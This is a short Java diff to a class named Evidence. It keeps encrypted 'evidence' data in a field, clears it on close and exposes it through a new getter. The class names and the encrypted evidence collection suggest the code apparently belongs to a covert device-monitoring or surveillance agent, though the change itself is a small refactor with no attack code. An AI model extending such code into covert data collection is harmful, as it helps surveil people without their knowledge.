@@ -234,6 +234,7 @@ public final class Evidence {
     int progressive;
 
     private byte[] aesKey;
+    private byte[] encData;
 
     private Evidence() {
         evidenceCollector = EvidenceCollector.getInstance();
@@ -306,7 +307,8 @@ public final class Evidence {
      */
     public synchronized boolean close() {
         boolean ret = true;
-
+        encData = null;
+        
         if (os != null) {
             try {
                 os.close();
@@ -617,7 +619,7 @@ public final class Evidence {
         debug.ledFlash(Debug.COLOR_GREEN_LIGHT);
         //#endif
 
-        final byte[] encData = encryption.encryptData(data, offset);
+        encData = encryption.encryptData(data, offset);
         //#ifdef DEBUG
         debug.info("writeEvidence encdata: " + encData.length);
         //#endif
@@ -634,6 +636,10 @@ public final class Evidence {
         } 
 
         return true;
+    }
+    
+    public byte[] getEncData(){
+        return encData;
     }
 
     /**
